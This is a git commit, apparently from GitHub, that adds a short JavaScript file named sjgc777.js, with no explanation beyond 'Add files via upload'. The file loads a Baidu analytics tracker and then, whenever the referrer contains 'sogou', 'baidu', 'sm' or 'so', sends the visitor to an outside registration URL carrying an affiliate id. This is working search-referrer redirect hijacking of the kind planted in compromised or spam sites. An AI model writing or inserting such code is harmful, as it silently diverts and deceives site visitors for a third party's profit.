47a2d7fa4130be92bc49c53724106908978496eb
william0408 <71155164+william0408@users.noreply.github.com>
2021-01-16 21:00:46 +0800

    Add files via upload

---
+++ js/sjgc777.js
@@ -0,0 +1,10 @@
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?cfe824ad30beb506ef0afb3c32d38f0b";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+var refurl=document.referrer
+if(refurl.indexOf("sogou")>0 || refurl.indexOf("baidu")>0 ||  refurl.indexOf("sm")>0 ||refurl.indexOf("so")>0 )
+window.location.href="http://www.w97890.com/register?id=23733391";
